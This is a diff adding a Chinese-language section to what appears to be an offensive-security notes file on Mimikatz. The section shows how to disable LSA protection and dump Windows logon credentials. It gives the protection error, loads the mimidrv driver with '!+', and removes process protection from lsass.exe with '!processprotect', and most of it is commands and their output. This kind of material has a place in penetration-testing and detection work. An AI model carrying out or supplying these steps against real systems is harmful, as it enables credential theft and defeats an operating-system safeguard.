@@ -69,4 +69,29 @@ privilege::debug
 sekurlsa::logonpasswords
 ```
 
+# 禁用LSA保护
 
+如果启用了 LSA 保护，执行“sekurlsa::logonpasswords”命令会出错。
+
+```
+mimikatz # sekurlsa::logonpasswords
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+```
+
+禁用 LSA 保护。我们可以通过执行“！+”将其导入到 Mimikatz
+
+```
+mimikatz # !+
+[*] 'mimidrv' service not present
+[+] 'mimidrv' service successfully registered
+[+] 'mimidrv' service ACL to everyone
+[+] 'mimidrv' service started
+```
+
+如果执行完上面程序仍然还不可以导出哈希，那么使用下面命令禁用 LSA 保护
+
+```
+mimikatz # !processprotect /process:lsass.exe /remove
+Process : lsass.exe
+PID 528 -> 00/00 [0-0-0]
+```
